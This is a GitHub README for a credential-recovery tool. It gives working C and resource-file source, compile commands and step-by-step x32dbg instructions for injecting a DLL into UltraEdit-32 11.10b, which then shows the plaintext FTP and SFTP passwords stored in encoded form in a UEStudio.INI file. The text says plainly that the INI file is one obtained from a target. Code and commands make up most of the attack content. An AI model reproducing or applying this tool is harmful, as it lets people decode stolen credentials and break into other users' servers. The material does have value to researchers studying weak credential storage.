# BorgDLL
Using DLL injection to recover encoded credentials

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue99.png)

This example shows how to compile a Windows DLL and inject it using x32dbg into UltraEdit-32 verion 11.10b in order to expose the plaintext passwords from the encoded strings stored in the UEStudio.INI file.  This scenario is useful when you have obtained a target's INI file and you wish to recover the plaintext FTP and SFTP/SSH credentials from memory, rather than throw them at a honeypot.  The password encoding scheme is a complex proprietary obfuscation algorithm, so rather than port the algorithm to a scripting language, you can use this technique to turn your own installation of UltraEdit-32 into a personal decoder ring.  This example takes the UEStudio.INI file and loads it under the application installed on a Windows 7 Pro 32-bit VM.

The binaries that were reverse engineered for this demonstration are:<br />
```
uedit32.exe file ver 11.1.2.0 SHA1 = bea1b540a597f9750ccff19cea5615037ccd350d
ueres.dll file ver 11.1.2.0 SHA1 = f30c20e822630e8759c5ecf037fa23856aeb851b
```

UltraEdit-32 verion 11.10b looks like this when you launch it.

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue00.png)

The application allows you to retrieve files to be edited via FTP or SFTP.

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue01.png)

The password for a connection entry is encoded as 256 hexadecimal characters.

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue02.png)

The dialog box resource where a user enters credentials is found in the `ueres.dll` file.  The following control IDs will be used in this example.

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue03.png)

This is the dialog box resource file `showpw.rc` that will be used to display the plaintext credentials.

```
#include <windows.h>
#define IDD_DLGPASSWD 100
#define IDC_PLAINTEXT 1
#define IDC_OK 2

100 DIALOG 40, 40, 300, 110
STYLE DS_SETFONT | DS_SETFOREGROUND | WS_POPUP | WS_CAPTION
CAPTION "Password Decoder"
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
FONT 11, "Courier New"
{
   EDITTEXT IDC_PLAINTEXT, 11, 15, 280, 59, ES_LEFT | ES_MULTILINE | ES_AUTOVSCROLL | ES_WANTRETURN | WS_CHILD | WS_VISIBLE | WS_BORDER | WS_VSCROLL
   PUSHBUTTON "&OK", IDC_OK, 128, 84, 38, 12, BS_PUSHBUTTON | WS_CHILD | WS_VISIBLE
}
```

compile the above resource file like this:<br />
`i686-w64-mingw32-windres showpw.rc -O coff -o showpw.res`

This is the C program `showpw.c` that will be used to create the DLL.  It starts a thread on DLL_PROCESS_ATTACH when LoadLibrary is called from the debugger and monitors for changes in the "FTP Accounts" window.

```c
#include <windows.h>
#include <string.h>

#define IDC_PASSWORD 343 // "Password" edit control from Dialog 161 Resource Hacker ueres.dll
#define IDC_USERNAME 134 // "Name" edit control from Dialog 161 Resource Hacker ueres.dll
#define IDC_IPDOMAIN 342 // "Domain or IP Address" edit control from Dialog 161 Resource Hacker ueres.dll
#define IDD_DLGPASSWD 100
#define IDC_PLAINTEXT 1
#define IDC_OK 2

char sOutput[1000] = {0};

DWORD WINAPI pwthread(LPVOID lpParam);
BOOL CALLBACK DialogProc(HWND hwndDlg, UINT message, WPARAM wParam, LPARAM lParam);

DWORD WINAPI pwthread(LPVOID lpParam)
{
   HWND hWndDlg;
   char sEntry1[500] = {0}, sEntry2[500] = {0}, sPassword[500] = {0};
   char sDomain[200] = {0}, sUser[200] = {0};
   HMODULE hDll;

   while(1)
   {
      hWndDlg = FindWindow(NULL, "FTP Accounts");
      if(hWndDlg)
      {
         hDll = GetModuleHandle("showpw.dll");
         Sleep(1000);
         if(GetDlgItemText(hWndDlg, IDC_IPDOMAIN, sDomain, 190))
         {
            strncpy(sEntry2, sDomain, 195);
            if(GetDlgItemText(hWndDlg, IDC_USERNAME, sUser, 190))
            {
               strncat(sEntry2, sUser, 195);
               if(strncmp(sEntry1, sEntry2, 495))
               {
                  strncpy(sEntry1, sEntry2, 495);
                  if(GetDlgItemText(hWndDlg, IDC_PASSWORD, sPassword, 490))
                  {
                     strcpy(sOutput, "Domain/IP = ");
                     strcat(sOutput, sDomain);
                     strcat(sOutput, "\r\n");
                     strcat(sOutput, "Username = ");
                     strcat(sOutput, sUser);
                     strcat(sOutput, "\r\n");
                     strcat(sOutput, "Password = ");
                     strcat(sOutput, sPassword);
                     strcat(sOutput, "\r\n\r\n");
                     DialogBox(hDll, MAKEINTRESOURCE(IDD_DLGPASSWD), NULL, DialogProc);
                  }
               }
            }
         }
      }
      else
      {
         Sleep(1000);
      }
   }
   ExitThread(0);
}

BOOL CALLBACK DialogProc(HWND hwndDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
   switch(message)
   {
      case WM_INITDIALOG:
         SetDlgItemText(hwndDlg, IDC_PLAINTEXT, sOutput);
         break;
      case WM_COMMAND:
         switch(LOWORD(wParam))
         {
            case IDC_PLAINTEXT:
               break;
            case IDC_OK:
               EndDialog(hwndDlg, wParam);
               return TRUE;
         }
   }
   return FALSE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
{
   HANDLE hThrd;

   switch(dwReason)
   {
      case DLL_PROCESS_ATTACH:
         hThrd = CreateThread(NULL, 0, pwthread, NULL, 0, NULL);
         break;
      case DLL_THREAD_ATTACH:
         break;
      case DLL_THREAD_DETACH:
         break;
      case DLL_PROCESS_DETACH:
         break;
   }
   return TRUE;
}
```

compile the above source file like this:<br />
`i686-w64-mingw32-gcc -s -m32 -shared -Wl,--kill-at -o showpw.dll showpw.c showpw.res`<br />
then copy it to the Windows 7 VM.

On the Windows 7 VM, launch x32dbg, then from the menu go to File > Open, and navigate to `C:\Program Files\IDM COMPUTER SOLUTIONS\ULTRAEDIT-32` then select `uedit32.exe`

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue04.png)

The program will pause when the debugger attaches.

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue05.png)

Restart the application with the command line changed to use the INI file you wish to load.  For example:<br />
`"C:\Program Files\IDM COMPUTER SOLUTIONS\ULTRAEDIT-32\uedit32.exe" /i="C:\Users\admin\Desktop\UEStudio.INI"`

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue06.png)

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue07.png)

The program will pause again when restarted.

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue08.png)

Click on the Run button in the debugger until the application starts.

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue09.png)

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue10.png)

Now go to the Symbols tab, right-click and Load Library.  Select the DLL you copied over.

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue11.png)

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue12.png)

The DLL will load and show up in the module list.

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue13.png)

Click on the Run button in the debugger until the application starts.

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue09.png)

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue14.png)

Go to the application menu `File > FTP > Open from FTP` and click on the `Accounts` button.

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue15.png)

As you cycle through the Account entries in the combo box you should see the credentials appear in the dialog box from the injected DLL.

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue16.png)

![alt text](https://github.com/billchaison/BorgDLL/raw/main/ue17.png)
